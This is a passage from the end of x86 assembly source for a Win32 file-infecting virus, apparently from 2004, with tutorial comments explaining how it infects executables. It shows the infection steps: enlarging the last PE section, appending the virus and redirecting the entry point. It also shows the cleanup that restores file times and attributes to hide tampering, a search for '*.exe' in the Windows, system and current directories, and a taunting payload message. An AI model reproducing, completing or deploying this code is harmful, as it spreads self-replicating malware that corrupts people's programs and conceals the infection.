   ;; And thats how you infect a file by increasing the ;;
   ;; last section and appending to it :)               ;;
   ;;                                                   ;;
   ;; Lets see what we have been doing all that time in ;;
   ;; some short steps                                  ;;
   ;;                                                   ;;
   ;;     -) Locate PE header                           ;;
   ;;     -) Locate Directory Table at 78h              ;;
   ;;     -) Locate last section's header address       ;;
   ;;     -) Increase the size of raw data              ;;
   ;;     -) Increase the virtual size                  ;;
   ;;     -) Append the virus to the end                ;;
   ;;     -) Locate the new IP                          ;;
   ;;     -) Mark the new IP                            ;;
   ;;     -) Increase the size of image                 ;;
   ;;                                                   ;;
   ;; After you have infected the file its time that    ;;
   ;; you start cleaning after yourself *LOL* meaning   ;;
   ;; you have to close what you have opened and unmap  ;;
   ;; whatever you mapped before and any other stuff    ;;
   ;; like that                                         ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; The first thing is to unmap the view of the file  ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

   UnmapView:
       push    dword ptr [ebp + offset mapaddress]
       call    [ebp + __ADDR_UnmapViewOfFile]

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; The next step is to close the map handle          ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

   CloseMap:
       push    dword ptr [ebp + offset maphandle]
       call    [ebp + __ADDR_CloseHandle]

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Then we start closing the file, First we must     ;;
   ;; restore it's time                                 ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

   CloseFile:
       lea ebx, [ebp + offset ftcreation]
       push    ebx
       add ebx, 8
       push    ebx
       add ebx, 8
       push    ebx
       push    dword ptr [ebp + offset filehandle]
       call    [ebp + __ADDR_SetFileTime]

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; In order to properly close the file we must set   ;;
   ;; its EOF at the exact end of file, So first we     ;;
   ;; move the pointer to the end and set the EOF       ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       push    0                           ; First we must set the file
       push    0                           ; Pointer at the end of file (that is the beginning + new file size)
       push    dword ptr [ebp + offset newfilesize]
       push    dword ptr [ebp + offset filehandle]
       call    [ebp + __ADDR_SetFilePointer]

       push    dword ptr [ebp + offset filehandle]
       call    [ebp + __ADDR_SetEndOfFile]

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; And finaly we close the file                      ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       push    dword ptr [ebp + offset filehandle]
       call    [ebp + __ADDR_CloseHandle]

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Then we must restore file attributes              ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       push    dword ptr [ebp + offset fileattributes]
       push    dword ptr [ebp + offset fileofs]
       call    [ebp + __ADDR_SetFileAttributesA]
       jmp InfectionSuccesful

   InfectionError:
       stc                             ; CF set if an error occured or file was already infected
       jmp OutOfhere

   InfectionSuccesful:
       cmp word ptr [ebp + offset infectionflag], 0FFh
       je  InfectionError
       clc                             ; If all is ok, CF is reset

   OutOfhere:
       popad                               ; Restore registers
       ret

   InfectFile  endp


       MAX_PATH EQU 260                        ; Maximum Length Of Filename

       FILETIME          STRUC                 ; Filetime Structure
           FT_dwLowDateTime  dd ?
           FT_dwHighDateTime dd ?
       FILETIME          ENDS

       WIN32_FIND_DATA       STRUC
           FileAttributes    dd       ?                ; Attributes
           CreationTime      FILETIME ?                ; time of creation
           LastAccessTime    FILETIME ?                ; last access time
           LastWriteTime     FILETIME ?                ; last modificationm
           FileSizeHigh      dd       ?                ; filesize
           FileSizeLow       dd       ?
           Reserved0         dd       ?
           Reserved1         dd       ?
           FileName          dd       MAX_PATH dup (?)         ; long filename
           AlternateFileName dd       14   dup (?)         ; short filename
       WIN32_FIND_DATA       ENDS

       search WIN32_FIND_DATA ?                    ; our search area

       windir db 128h dup(0)                       ; Windows directory
       sysdir db 128h dup(0)                       ; System directory
       crtdir db 128h dup(0)                       ; Current directory

       exestr db "*.exe", 0

       ;;;;;;;;;;;;;;;;;
       ;TEMP VARS
       ;;;;;;;;;;;;;;;;
       infections  dd  0
       newfilesize dd  0
       infectionflag   dd  0
       memory      dd  0
       fileofs     dd  0
       fileattributes  dd  0
       filehandle  dd  0
       ftcreation  dd  0
       maphandle   dd  0
       mapaddress  dd  0
       PEheader    dd  0
       oldip       dd  0
       filealign   dd  0
       oldrawsize  dd  0
       newrawsize  dd  0
       newip       dd  0
       incrawsize  dd  0
       start       dd  0
       imagebase   dd  0
       viruslen    equ (VirusEnd - VirusStart)

       Copyright   db '[Win32.AnalBeeds] (C) 2004 by Sinclaire', 0

       szTitle     db '[Win32.AnalBeeds]', 0

       szText      db 'Succeeded to infiltarte your computer and' , 0ah, 0dh
               db 'infect your system, all haile to Sinclaire' , 0ah, 0dh, 0dh
               db 'I Guess you hate me now =)', 0ah, 0dh, 0dh
               db 'Greetz to MENZO, OMARESTEIN, CHE-GUEVARA and others', 0


       ; DLL name we are going to import
       __DLL_User32        db 'User32', 0

       ; API's we are going to use
       __API_LoadLibraryA          db 'LoadLibraryA', 0

       __API_MessageBoxA           db 'MessageBoxA', 0
       __API_ExitProcess           db 'ExitProcess', 0

       __API_FindFirstFileA        db 'FindFirstFileA', 0
       __API_FindNextFileA         db 'FindNextFileA', 0
       __API_GetFileAttributesA    db 'GetFileAttributesA', 0
       __API_SetFileAttributesA    db 'SetFileAttributesA', 0
       __API_CreateFileA           db 'CreateFileA', 0
       __API_GetFileTime           db 'GetFileTime', 0
       __API_GetFileSize           db 'GetFileSize', 0
       __API_CreateFileMappingA    db 'CreateFileMappingA', 0
       __API_MapViewOfFile         db 'MapViewOfFile', 0
       __API_UnmapViewOfFile       db 'UnmapViewOfFile', 0
       __API_CloseHandle           db 'CloseHandle', 0
       __API_SetFileTime           db 'SetFileTime', 0
       __API_SetFilePointer        db 'SetFilePointer', 0
       __API_GetWindowsDirectoryA  db 'GetWindowsDirectoryA', 0
       __API_GetSystemDirectoryA   db 'GetSystemDirectoryA', 0
       __API_GetCurrentDirectoryA  db 'GetCurrentDirectoryA', 0
       __API_SetCurrentDirectoryA  db 'SetCurrentDirectoryA', 0
       __API_SetEndOfFile          db 'SetEndOfFile', 0


       __ADDR_MessageBoxA          dd 0 ; Address of MessageBoxA
       __ADDR_ExitProcess          dd 0 ; Address of ExitProcess

       __ADDR_FindFirstFileA       dd 0 ; Address of FindFirstFileA
       __ADDR_FindNextFileA        dd 0 ; Address of FindNextFileA
       __ADDR_GetFileAttributesA   dd 0 ; Address of GetFileAttributesA
       __ADDR_SetFileAttributesA   dd 0 ; Address of SetFileAttributesA
       __ADDR_CreateFileA          dd 0 ; Address of CreateFileA
       __ADDR_GetFileTime          dd 0 ; Address of GetFileTime
       __ADDR_GetFileSize          dd 0 ; Address of GetFileSize
       __ADDR_CreateFileMappingA   dd 0 ; Address of CreateFileMappingA
       __ADDR_MapViewOfFile        dd 0 ; Address of MapViewOfFile
       __ADDR_UnmapViewOfFile      dd 0 ; Address of UnmapViewOfFile
       __ADDR_CloseHandle          dd 0 ; Address of CloseHandle
       __ADDR_SetFileTime          dd 0 ; Address of SetFileTime
       __ADDR_SetFilePointer       dd 0 ; Address of SetFilePointer
       __ADDR_GetWindowsDirectoryA dd 0 ; Address of GetWindowsDirectoryA
       __ADDR_GetSystemDirectoryA  dd 0 ; Address of GetSystemDirectoryA
       __ADDR_GetCurrentDirectoryA dd 0 ; Address of GetCurrentDirectoryA
       __ADDR_SetCurrentDirectoryA dd 0 ; Address of SetCurrentDirectoryA
       __ADDR_SetEndOfFile     dd 0 ; Address of SetEndOfFile

       _User32     dd 0 ; Handle to user32
       _Kernel32   dd 0 ; Handle to kernel32

   VirusEnd:


   end VirusStart
